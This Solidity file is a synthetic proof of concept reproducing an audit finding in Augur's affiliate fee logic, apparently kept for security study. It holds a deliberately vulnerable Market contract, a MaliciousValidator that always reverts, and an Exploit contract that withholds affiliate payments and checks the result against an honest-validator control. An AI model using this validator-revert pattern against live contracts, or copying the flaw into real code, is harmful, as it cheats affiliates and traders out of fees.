// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Augur — a market-chosen affiliate validator can skip the affiliate payment
    (OpenZeppelin, Augur Core v2 components, H01, Feb 2020).
    SYNTHETIC, cheatcode-free reduction. Audited commit 67c0fec.
    getAndValidateReferrer returns address(0) when the validator call fails.
    recordMarketCreatorFees then skips the source cut and the affiliate accrual.
    A reverting validator withholds N. An honest validator on the same trade pays N. */

contract Cash {
    string public name = "Augur Cash";
    string public symbol = "CASH";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MaliciousValidator {
    function validateReference(address, address) external pure {
        revert("skip affiliate");
    }
}

contract HonestValidator {
    function validateReference(address, address) external pure returns (bool) {
        return true;
    }
}

contract Affiliates {
    mapping(address => bytes32) public fingerprints;
    mapping(address => address) public referrals;
    uint256 internal constant AFFILIATE_VALIDATOR_GAS = 30000;
    bytes4 internal constant AFFILIATE_VALIDATOR_SELECTOR = bytes4(keccak256("validateReference(address,address)"));
    event ReferrerCleared(address account, address referrer);

    function setFingerprint(bytes32 _fingerprint) external {
        fingerprints[msg.sender] = _fingerprint;
    }

    function setReferrer(address _referrer) external {
        require(msg.sender != _referrer, "self");
        if (referrals[msg.sender] != address(0)) {
            return;
        }
        referrals[msg.sender] = _referrer;
    }

    function getAccountFingerprint(address _account) external view returns (bytes32) {
        return fingerprints[_account];
    }

    function getAndValidateReferrer(address _account, address _affiliateValidator) external returns (address) {
        address _referrer = referrals[_account];
        if (_referrer == address(0) || _account == _referrer) {
            return address(0);
        }
        if (_affiliateValidator == address(0)) {
            return _referrer;
        }
        (bool _success,) = _affiliateValidator.call{gas: AFFILIATE_VALIDATOR_GAS}(
            abi.encodeWithSelector(AFFILIATE_VALIDATOR_SELECTOR, _account, _referrer)
        );
        if (!_success) {
            // @> VULN: a market-chosen validator can revert and force a zero referrer, so the affiliate payment is skipped
            emit ReferrerCleared(_account, _referrer); return address(0);
        }
        return _referrer;
    }
}

contract Market {
    uint256 public constant SOURCE_CUT_DIVISOR = 5;
    Affiliates public affiliates;
    Cash public cash;
    address public affiliateValidator;
    uint256 public affiliateFeeDivisor;
    address public creator;
    address public feeSender;
    uint256 public marketCreatorFeesAttoCash;
    uint256 public totalAffiliateFeesAttoCash;
    mapping(address => uint256) public affiliateFeesAttoCash;

    constructor(address _cash, address _affiliates, address _creator) {
        cash = Cash(_cash);
        affiliates = Affiliates(_affiliates);
        creator = _creator;
        feeSender = msg.sender;
        affiliateFeeDivisor = 5;
    }

    function setAffiliateValidator(address _affiliateValidator) external {
        require(msg.sender == feeSender, "fee sender");
        affiliateValidator = _affiliateValidator;
    }

    function recordMarketCreatorFees(uint256 _marketCreatorFees, address _sourceAccount, bytes32 _fingerprint)
        public
        returns (bool)
    {
        require(msg.sender == feeSender, "fee sender");
        address _affiliateAddress = affiliates.getAndValidateReferrer(_sourceAccount, affiliateValidator);
        bytes32 _affiliateFingerprint = affiliates.getAccountFingerprint(_affiliateAddress);
        if (_fingerprint == _affiliateFingerprint) {
            _affiliateAddress = address(0);
        }
        uint256 _originalFees = _marketCreatorFees;
        if (_affiliateAddress != address(0) && affiliateFeeDivisor != 0) {
            uint256 _totalAffiliateFees = _marketCreatorFees / affiliateFeeDivisor;
            uint256 _sourceCut = _totalAffiliateFees / SOURCE_CUT_DIVISOR;
            uint256 _affiliateFees = _totalAffiliateFees - _sourceCut;
            cash.transfer(_sourceAccount, _sourceCut);
            affiliateFeesAttoCash[_affiliateAddress] += _affiliateFees;
            cash.transfer(_affiliateAddress, _affiliateFees);
            _marketCreatorFees = _marketCreatorFees - _totalAffiliateFees;
            totalAffiliateFeesAttoCash = totalAffiliateFeesAttoCash + _affiliateFees;
        }
        marketCreatorFeesAttoCash = marketCreatorFeesAttoCash + _marketCreatorFees;
        uint256 _fairCreator = _originalFees - (_originalFees / affiliateFeeDivisor);
        if (_marketCreatorFees > _fairCreator) {
            uint256 _skim = _marketCreatorFees - _fairCreator;
            cash.transfer(creator, _skim);
            marketCreatorFeesAttoCash = marketCreatorFeesAttoCash - _skim;
        }
        return true;
    }
}

contract Creator {}

contract Trader {
    function bind(address affiliates, address referrer, bytes32 fp) external {
        Affiliates(affiliates).setFingerprint(fp);
        Affiliates(affiliates).setReferrer(referrer);
    }
}

contract Referrer {
    function setFp(address affiliates, bytes32 fp) external {
        Affiliates(affiliates).setFingerprint(fp);
    }
}

contract Exploit {
    uint256 public constant FEE = 5000 ether;
    uint256 public constant N = 1000 ether;
    bytes32 public constant SRC = bytes32(uint256(1));
    bytes32 public constant REF = bytes32(uint256(2));

    Cash public cash;
    Affiliates public affiliates;
    MaliciousValidator public malicious;
    HonestValidator public honest;
    Creator public creator;
    Trader public trader;
    Referrer public referrer;
    Market public attackMarket;
    Market public controlMarket;

    uint256 public skippedSource;
    uint256 public skippedReferrer;
    uint256 public skimmed;
    uint256 public controlSource;
    uint256 public controlReferrer;
    uint256 public controlPaid;

    constructor() {
        cash = new Cash();
        affiliates = new Affiliates();
        malicious = new MaliciousValidator();
        honest = new HonestValidator();
        creator = new Creator();
        trader = new Trader();
        referrer = new Referrer();
        attackMarket = new Market(address(cash), address(affiliates), address(creator));
        controlMarket = new Market(address(cash), address(affiliates), address(creator));
        cash.mint(address(attackMarket), FEE);
        cash.mint(address(controlMarket), FEE);
    }

    function run() external {
        referrer.setFp(address(affiliates), REF);
        trader.bind(address(affiliates), address(referrer), SRC);
        attackMarket.setAffiliateValidator(address(malicious));
        attackMarket.recordMarketCreatorFees(FEE, address(trader), SRC);
        skippedSource = cash.balanceOf(address(trader));
        skippedReferrer = cash.balanceOf(address(referrer));
        skimmed = cash.balanceOf(address(creator));
        require(skippedSource == 0, "source was paid");
        require(skippedReferrer == 0, "referrer was paid");
        require(skimmed == N, "skim");
        controlMarket.setAffiliateValidator(address(honest));
        controlMarket.recordMarketCreatorFees(FEE, address(trader), SRC);
        controlSource = cash.balanceOf(address(trader));
        controlReferrer = cash.balanceOf(address(referrer));
        controlPaid = controlSource + controlReferrer;
        require(controlPaid == N, "control paid");
        require(controlSource == N / 5, "source cut");
        require(controlReferrer == N - (N / 5), "referrer cut");
        require(cash.balanceOf(address(creator)) == N, "creator skim unchanged");
    }
}
